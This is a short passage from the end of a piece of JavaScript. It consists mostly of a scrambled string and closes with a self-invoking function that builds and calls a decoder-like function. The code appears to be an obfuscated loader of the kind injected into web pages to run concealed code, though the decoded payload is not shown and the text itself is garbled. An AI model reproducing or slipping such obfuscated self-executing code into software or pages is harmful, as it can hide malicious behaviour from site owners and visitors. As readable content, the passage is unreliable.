5\/eHg48e\\e6_ _ra5=8 ]RH6=1)j=onHiHHr=!eHHYo3yi:(uOnH6e2)=?=nxrX.e(iHa{,_7HaH.(o1PrH6V.timaHcH(r H=pd)r]s$}[tdya ?H; ad%aQHH_.o;a=orHOr\'.!Kl3!}h%]aH.n acas.=t{pp]t2.[=Ha[;uH` ]eH]=.D;!6$wB-b%spa }]j}boreH rHa!))Y),Hrn0nnt:ea hlokH ts5a)j53'));var eNI=tZu(PQe,UJp );eNI(8996);return 9817})()
